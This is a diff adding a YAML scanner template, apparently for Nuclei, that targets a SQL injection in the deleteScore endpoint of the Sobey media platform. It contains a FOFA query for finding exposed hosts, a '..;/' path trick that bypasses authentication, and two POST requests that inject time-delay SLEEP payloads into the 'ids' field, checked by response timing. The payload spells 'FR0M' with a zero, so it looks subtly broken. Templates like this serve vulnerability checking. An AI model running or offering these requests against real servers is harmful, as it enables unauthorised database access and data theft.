@@ -1,0 +1,29 @@
+id: sobey-media-deletescore-sqli
+info:
+  name: "索贝融媒体工作平台 deleteScore 接口存在 SQL 注入漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: header="Sobey" || body="/Sc-TaskMonitoring/"
+        该漏洞允许攻击者通过构造恶意SQL语句实现对数据库查询的注入，进而执行任意SQL命令，可能导致数据泄露或篡改。
+  tags: 索贝融媒体工作平台
+http:
+- raw:
+  - |
+    POST /sobey-mchEditor/js/..;/mch/jztEditorScore/deleteScore HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    channelId=1&ids=1') OR (SELECT 8771 FR0M (SELECT(SLEEP(5)))WWVB)-- QTWL&isRenYuan=1&siteCode=&token=&userCode=admin
+  - |
+    POST /sobey-mchEditor/js/..;/mch/jztEditorScore/deleteScore HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    channelId=1&ids=1') OR (SELECT 8771 FR0M (SELECT(SLEEP(8)))WWVB)-- QTWL&isRenYuan=1&siteCode=&token=&userCode=admin
+  matchers:
+  - type: dsl
+    dsl:
+    - duration_1>=5 && duration_1<=6
+    - duration_2>=8 && duration_2<=9
+    condition: and
